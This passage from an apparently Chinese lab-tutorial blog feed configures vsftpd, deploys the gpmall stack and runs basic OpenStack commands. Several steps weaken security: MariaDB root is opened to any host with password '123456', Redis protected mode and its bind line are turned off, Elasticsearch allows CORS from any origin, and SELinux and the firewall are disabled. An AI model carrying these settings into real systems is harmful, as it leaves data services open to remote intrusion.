class="line">#设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=50010</span><br></pre></td></tr></table></figure><blockquote>总配置：</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Example config file /etc/vsftpd/vsftpd.conf</span><br><span class="line">#</span><br><span class="line"># The default compiled in settings are fairly paranoid. This sample file</span><br><span class="line"># loosens things up a bit, to make the ftp daemon more usable.</span><br><span class="line"># Please see vsftpd.conf.5 for all compiled in defaults.</span><br><span class="line">#</span><br><span class="line"># READ THIS: This example file is NOT an exhaustive list of vsftpd options.</span><br><span class="line"># Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd&#x27;s</span><br><span class="line"># capabilities.</span><br><span class="line">#</span><br><span class="line"># Allow anonymous FTP? (Beware - allowed by default if you comment this out).</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#</span><br><span class="line"># Uncomment this to allow local users to log in.</span><br><span class="line"># When SELinux is enforcing check for SE bool ftp_home_dir</span><br><span class="line">local_enable=YES</span><br><span class="line">#</span><br><span class="line"># Uncomment this to enable any form of FTP write command.</span><br><span class="line">write_enable=YES</span><br><span class="line">#</span><br><span class="line"># Default umask for local users is 077. You may wish to change this to 022,</span><br><span class="line"># if your users expect that (022 is used by most other ftpd&#x27;s)</span><br><span class="line">local_umask=022</span><br><span class="line">#</span><br><span class="line"># Uncomment this to allow the anonymous FTP user to upload files. This only</span><br><span class="line"># has an effect if the above global write enable is activated. Also, you will</span><br><span class="line"># obviously need to create a directory writable by the FTP user.</span><br><span class="line"># When SELinux is enforcing check for SE bool allow_ftpd_anon_write, allow_ftpd_full_access</span><br><span class="line">#anon_upload_enable=YES</span><br><span class="line">#</span><br><span class="line"># Uncomment this if you want the anonymous FTP user to be able to create</span><br><span class="line"># new directories.</span><br><span class="line">#anon_mkdir_write_enable=YES</span><br><span class="line">#</span><br><span class="line"># Activate directory messages - messages given to remote users when they</span><br><span class="line"># go into a certain directory.</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">#</span><br><span class="line"># Activate logging of uploads/downloads.</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">#</span><br><span class="line"># Make sure PORT transfer connections originate from port 20 (ftp-data).</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">#</span><br><span class="line"># If you want, you can arrange for uploaded anonymous files to be owned by</span><br><span class="line"># a different user. Note! Using &quot;root&quot; for uploaded files is not</span><br><span class="line"># recommended!</span><br><span class="line">#chown_uploads=YES</span><br><span class="line">#chown_username=whoever</span><br><span class="line">#</span><br><span class="line"># You may override where the log file goes if you like. The default is shown</span><br><span class="line"># below.</span><br><span class="line">#xferlog_file=/var/log/xferlog</span><br><span class="line">#</span><br><span class="line"># If you want, you can have your log file in standard ftpd xferlog format.</span><br><span class="line"># Note that the default log file location is /var/log/xferlog in this case.</span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">#</span><br><span class="line"># You may change the default value for timing out an idle session.</span><br><span class="line">#idle_session_timeout=600</span><br><span class="line">#</span><br><span class="line"># You may change the default value for timing out a data connection.</span><br><span class="line">#data_connection_timeout=120</span><br><span class="line">#</span><br><span class="line"># It is recommended that you define on your system a unique user which the</span><br><span class="line"># ftp server can use as a totally isolated and unprivileged user.</span><br><span class="line">#nopriv_user=ftpsecure</span><br><span class="line">#</span><br><span class="line"># Enable this and the server will recognise asynchronous ABOR requests. Not</span><br><span class="line"># recommended for security (the code is non-trivial). Not enabling it,</span><br><span class="line"># however, may confuse older FTP clients.</span><br><span class="line">#async_abor_enable=YES</span><br><span class="line">#</span><br><span class="line"># By default the server will pretend to allow ASCII mode but in fact ignore</span><br><span class="line"># the request. Turn on the below options to have the server actually do ASCII</span><br><span class="line"># mangling on files when in ASCII mode. The vsftpd.conf(5) man page explains</span><br><span class="line"># the behaviour when these options are disabled.</span><br><span class="line"># Beware that on some FTP servers, ASCII support allows a denial of service</span><br><span class="line"># attack (DoS) via the command &quot;SIZE /big/file&quot; in ASCII mode. vsftpd</span><br><span class="line"># predicted this attack and has always been safe, reporting the size of the</span><br><span class="line"># raw file.</span><br><span class="line"># ASCII mangling is a horrible feature of the protocol.</span><br><span class="line">#ascii_upload_enable=YES</span><br><span class="line">#ascii_download_enable=YES</span><br><span class="line">#</span><br><span class="line"># You may fully customise the login banner string:</span><br><span class="line">#ftpd_banner=Welcome to blah FTP service.</span><br><span class="line">#</span><br><span class="line"># You may specify a file of disallowed anonymous e-mail addresses. Apparently</span><br><span class="line"># useful for combatting certain DoS attacks.</span><br><span class="line">#deny_email_enable=YES</span><br><span class="line"># (default follows)</span><br><span class="line">#banned_email_file=/etc/vsftpd/banned_emails</span><br><span class="line">#</span><br><span class="line"># You may specify an explicit list of local users to chroot() to their home</span><br><span class="line"># directory. If chroot_local_user is YES, then this list becomes a list of</span><br><span class="line"># users to NOT chroot().</span><br><span class="line"># (Warning! chroot&#x27;ing can be very dangerous. If using chroot, make sure that</span><br><span class="line"># the user does not have write access to the top level directory within the</span><br><span class="line"># chroot)</span><br><span class="line">#chroot_local_user=YES</span><br><span class="line">#chroot_list_enable=YES</span><br><span class="line"># (default follows)</span><br><span class="line">#chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#</span><br><span class="line"># You may activate the &quot;-R&quot; option to the builtin ls. This is disabled by</span><br><span class="line"># default to avoid remote users being able to cause excessive I/O on large</span><br><span class="line"># sites. However, some broken FTP clients such as &quot;ncftp&quot; and &quot;mirror&quot; assume</span><br><span class="line"># the presence of the &quot;-R&quot; option, so there is a strong case for enabling it.</span><br><span class="line">#ls_recurse_enable=YES</span><br><span class="line">#</span><br><span class="line"># When &quot;listen&quot; directive is enabled, vsftpd runs in standalone mode and</span><br><span class="line"># listens on IPv4 sockets. This directive cannot be used in conjunction</span><br><span class="line"># with the listen_ipv6 directive.</span><br><span class="line">listen=YES</span><br><span class="line">#</span><br><span class="line"># This directive enables listening on IPv6 sockets. By default, listening</span><br><span class="line"># on the IPv6 &quot;any&quot; address (::) will accept connections from both IPv6</span><br><span class="line"># and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6</span><br><span class="line"># sockets. If you want that (perhaps because you want to listen on specific</span><br><span class="line"># addresses) then you must run two copies of vsftpd with two configuration</span><br><span class="line"># files.</span><br><span class="line"># Make sure, that one of the listen options is commented !!</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">userlist_enable=YES</span><br><span class="line">tcp_wrappers=YES</span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">##设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/22</span><br><span class="line">##全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">##启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">##指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">##本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=100.26.28.49</span><br><span class="line">##设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">##建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=50000</span><br><span class="line">##设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=50010</span><br><span class="line">#</span><br></pre></td></tr></table></figure><h2 id="配置例外用户名单"><a href="#配置例外用户名单" class="headerlink" title="配置例外用户名单"></a>配置例外用户名单</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/chroot_list</span><br></pre></td></tr></table></figure><blockquote>添加用户，此处我是ftp22。</blockquote><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/3.png"></p><h2 id="重启vsftpd服务"><a href="#重启vsftpd服务" class="headerlink" title="重启vsftpd服务"></a>重启vsftpd服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart vsftpd.service</span><br></pre></td></tr></table></figure><h2 id="创建文件，测试验证。"><a href="#创建文件，测试验证。" class="headerlink" title="创建文件，测试验证。"></a>创建文件，测试验证。</h2><blockquote>cmd命令行，输入ftp加空格接上对应ip地址，登录ftp。</blockquote><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/4.png"><br><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/5.png"><br><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# touch /var/ftp/22/yjs213-22-pjl.txt</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装vsftpd&quot;&gt;&lt;a href=&quot;#安装vsftpd&quot; class=&quot;headerlink&quot; title=&quot;安装vsftpd&quot;&gt;&lt;/a&gt;安装vsftpd&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>云主机应用部署</title>
    <link href="https://jielunya.github.io/2022/12/08/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/"/>
    <id>https://jielunya.github.io/2022/12/08/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/</id>
    <published>2022-12-08T13:35:27.246Z</published>
    <updated>2022-12-08T13:51:24.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/1.png"><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/2.png"></p><h2 id="网卡配置："><a href="#网卡配置：" class="headerlink" title="网卡配置："></a>网卡配置：</h2><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/3.png"><br>systemcl restart network重启网卡<br>ip addr查看ens33网卡的ip地址<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/4.png"><br>使用Finalshell连接<br>修改主机名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hostnamectl set-hostname gpmall-pjl</span><br><span class="line">[root@localhost ~]# logout</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/5.png"></p><h2 id="修改hosts文件："><a href="#修改hosts文件：" class="headerlink" title="修改hosts文件："></a>修改hosts文件：</h2><p>配置全局变量，在&#x2F;etc&#x2F;hosts文档最后加入如下代码：<br>192.168.200.22 kafka.mall<br>192.168.200.22 mysql.mall<br>192.168.200.22 redis.mall<br>192.168.200.22 zookeeper.mall<br>192.168.200.22 java.mall<br>192.168.200.22 gpmall-pjl<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/6.png"></p><h2 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h2><p>将两个镜像文件放到&#x2F;root下<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/7.png"></p><h3 id="创建挂载点目录"><a href="#创建挂载点目录" class="headerlink" title="创建挂载点目录"></a>创建挂载点目录</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# mkdir /opt/centos</span><br><span class="line">[root@gpmall-pjl ~]# mkdir /opt/paas</span><br><span class="line">挂载镜像</span><br><span class="line">[root@gpmall-pjl ~]# mount -o loop CentOS-7-x86_64-DVD-1804.iso /opt/centos</span><br><span class="line">[root@gpmall-pjl ~]# mount -o loop chinaskills_cloud_pa.iso /opt/paas</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/8.png"></p><h2 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# cd /etc/yum.repos.d/</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# mkdir bak</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# mv *.repo bak</span><br><span class="line">[root@gpmall-pjl yum.repos.d]# vi /etc/yum.repos.d/centos.repo</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/9.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[gpmall]</span><br><span class="line">name=gpmall</span><br><span class="line">baseurl=file:///opt/paas/ChinaskillMall/gpmall-repo/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl opt]# yum clean all</span><br><span class="line">[root@gpmall-pjl opt]# yum repolist</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/10.png"></p><h2 id="安装Java环境"><a href="#安装Java环境" class="headerlink" title="安装Java环境"></a>安装Java环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y java java-devel</span><br><span class="line">[root@gpmall-pjl ~]# java -version</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/11.png"></p><h2 id="安装redis缓存服务"><a href="#安装redis缓存服务" class="headerlink" title="安装redis缓存服务"></a>安装redis缓存服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y redis</span><br></pre></td></tr></table></figure><h2 id="安装Elasticsearch服务"><a href="#安装Elasticsearch服务" class="headerlink" title="安装Elasticsearch服务"></a>安装Elasticsearch服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y elasticsearch</span><br></pre></td></tr></table></figure><h2 id="安装nginx服务"><a href="#安装nginx服务" class="headerlink" title="安装nginx服务"></a>安装nginx服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y nginx</span><br></pre></td></tr></table></figure><h2 id="安装mariadb数据库"><a href="#安装mariadb数据库" class="headerlink" title="安装mariadb数据库"></a>安装mariadb数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# yum install -y mariadb mariadb-server</span><br></pre></td></tr></table></figure><h2 id="安装zookeeper"><a href="#安装zookeeper" class="headerlink" title="安装zookeeper"></a>安装zookeeper</h2><p>将下载好的zookeeper压缩包上传至&#x2F;opt&#x2F;目录下，并解压，然后进入zookeeper-3.4.14&#x2F;conf目录下，将zoo_sample.cfg文件重命名为zoo.cfg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ]# cd /opt</span><br><span class="line">[root@gpmall-pjl opt]# tar -xzvf zookeeper-3.4.14.tar.gz</span><br><span class="line">[root@gpmall-pjl opt]# cd zookeeper-3.4.14/conf</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/12.png"></p><h2 id="启动zookeeper："><a href="#启动zookeeper：" class="headerlink" title="启动zookeeper："></a>启动zookeeper：</h2><p>进入到zookeeper-3.4.14&#x2F;bin目录下，启动zookeeper服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl bin]# ./zkServer.sh start</span><br><span class="line">[root@gpmall-pjl bin]# ./zkServer.sh status</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/13.png"><br>安装kafka（这里用到的kafka版本为kafka_2.11-1.1.1）<br>将kafka_2.11-1.1.1.tgz包上传到&#x2F;opt目录下，并解压<br>进入到kafka_2.11-1.1.1&#x2F;bin目录下，启动Kafka服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl opt]# tar -xzvf kafka_2.11-1.1.1.tgz</span><br><span class="line">[root@gpmall-pjl opt]# cd kafka_2.11-1.1.1/bin</span><br><span class="line">[root@gpmall-pjl bin]# ./kafka-server-start.sh -daemon ../config/server.properties</span><br><span class="line">[root@gpmall-pjl bin]# jps</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/14.png"></p><h2 id="配置、启动数据库"><a href="#配置、启动数据库" class="headerlink" title="配置、启动数据库"></a>配置、启动数据库</h2><p>修改&#x2F;etc&#x2F;my.cnf配置文件，添加字段如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">init_connect=&#x27;SET collation_connection=utf8_unicode_ci&#x27;</span><br><span class="line">init_conncet=&#x27;SET NAMES utf8&#x27;</span><br><span class="line">character-set-server=utf8</span><br><span class="line">collation-server=utf8_unicode_ci</span><br><span class="line">skip-character-set-client-handshake</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/15.png"></p><h3 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h3><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/16.png"></p><h3 id="登录mariadb数据库"><a href="#登录mariadb数据库" class="headerlink" title="登录mariadb数据库"></a>登录mariadb数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/17.png"></p><h3 id="设置root用户权限"><a href="#设置root用户权限" class="headerlink" title="设置root用户权限"></a>设置root用户权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;grant all privileges on *.* to root@localhost identified by &#x27;123456&#x27; with grant option;</span><br><span class="line">&gt;grant all privileges on *.* to root@&quot;%&quot; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure><p>将gpmall.sql文件上传至云主机的&#x2F;root目录下。创建数据库gpmall并导入gpmall.sql文件<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/18.png"></p><p>退出数据库并设置开机自启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl enable mariadb</span><br></pre></td></tr></table></figure><h2 id="配置、启动redis服务"><a href="#配置、启动redis服务" class="headerlink" title="配置、启动redis服务"></a>配置、启动redis服务</h2><p>修改redis配置文件，编辑&#x2F;etc&#x2F;redis.conf<br>将文件中bind 127.0.0.1这一行注释掉；将protected-mode yes改为protected-mode no<br> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/19.png"><br> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/20.png"></p><p>启动redis服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl start redis</span><br><span class="line">[root@gpmall-pjl ~]# systemctl enable redis</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/21.png"></p><h2 id="配置Elasticsearch服务并启动"><a href="#配置Elasticsearch服务并启动" class="headerlink" title="配置Elasticsearch服务并启动"></a>配置Elasticsearch服务并启动</h2><p>配置&#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml<br>在文档上面加入如下三行代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.cors.enabled:true</span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br><span class="line">http.cors.allow-credentials: true</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/22.png"><br>并将如下四条语句前的注释去掉，并修改network.host的ip为本机ip<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/23.png"><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/24.png"></p><p>最后修改完之后保存并退出，然后启动elasticsearch并设置开机自启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl start elasticsearch</span><br><span class="line">[root@gpmall-pjl ~]# systemctl enable elasticsearch</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/25.png"></p><h2 id="部署前端"><a href="#部署前端" class="headerlink" title="部署前端"></a>部署前端</h2><p>将dist目录上传至主机的&#x2F;root目录下，将dist目录下的文件，复制到nginx的默认项目路径（首先清空默认项目路径下的文件。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# rm -rf /usr/share/nginx/html/*</span><br><span class="line">[root@gpmall-pjl ~]# cp  -rvf dist/* /usr/share/nginx/html/</span><br></pre></td></tr></table></figure><p>修改nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf，添加映射如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /usr &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8082;</span><br><span class="line">&#125;</span><br><span class="line">location /shopping &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8081;</span><br><span class="line">&#125;</span><br><span class="line">location /cashier &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8083;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/26.png"><br>重启nginx服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl restart nginx</span><br><span class="line">[root@gpmall-pjl ~]# systemctl status nginx</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/27.png"></p><h2 id="部署后端"><a href="#部署后端" class="headerlink" title="部署后端"></a>部署后端</h2><p>将提供的4个jar包上传到服务器的&#x2F;root目录下<br>按顺序启动<br>按照顺序运行4个jar包（输入一条命令运行完成后，敲一下回车键，接着输入下一条命令）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;</span><br></pre></td></tr></table></figure><p>验证jar包运行状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# jobs</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/28.png"><br> 关闭selinux和防火墙<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]#  setenforce 0</span><br><span class="line">[root@gpmall-pjl ~]# systemctl stop firewalld</span><br><span class="line">[root@gpmall-pjl ~]# systemctl disable firewalld</span><br><span class="line">[root@gpmall-pjl ~]# curl http://192.168.200.22/#/home</span><br></pre></td></tr></table></figure><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/29.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;创建虚拟机&quot;&gt;&lt;a href=&quot;#创建虚拟机&quot; class=&quot;headerlink&quot; title=&quot;创建虚拟机&quot;&gt;&lt;/a&gt;创建虚拟机&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Openstack云平台的基础运维</title>
    <link href="https://jielunya.github.io/2022/12/07/Openstack%E4%BA%91%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/"/>
    <id>https://jielunya.github.io/2022/12/07/Openstack%E4%BA%91%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/</id>
    <published>2022-12-07T15:03:22.283Z</published>
    <updated>2022-12-24T12:02:58.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql基础运维"><a href="#mysql基础运维" class="headerlink" title="mysql基础运维"></a>mysql基础运维</h2><h3 id="查看数据库服务是否处于active状态"><a href="#查看数据库服务是否处于active状态" class="headerlink" title="查看数据库服务是否处于active状态"></a>查看数据库服务是否处于active状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# systemctl status mariadb</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/1.png"></p><h3 id="进入mysql，查看所有数据库"><a href="#进入mysql，查看所有数据库" class="headerlink" title="进入mysql，查看所有数据库"></a>进入mysql，查看所有数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/3.png"></p><h3 id="进入keystone数据库，查看所有表，查看local-user表记录"><a href="#进入keystone数据库，查看所有表，查看local-user表记录" class="headerlink" title="进入keystone数据库，查看所有表，查看local_user表记录"></a>进入keystone数据库，查看所有表，查看local_user表记录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use keystone</span><br><span class="line">MariaDB [keystone]&gt; select * from local_user;</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/4.png"></p><h2 id="keystone基础运维"><a href="#keystone基础运维" class="headerlink" title="keystone基础运维"></a>keystone基础运维</h2><h3 id="列出所有用户"><a href="#列出所有用户" class="headerlink" title="列出所有用户"></a>列出所有用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl~]# source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller-pjl ~]# openstack user list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/5.png"></p><h3 id="创建用户："><a href="#创建用户：" class="headerlink" title="创建用户："></a>创建用户：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user create panjielun --password 000000 --domain demo </span><br><span class="line">--project admin</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/7.png"></p><h3 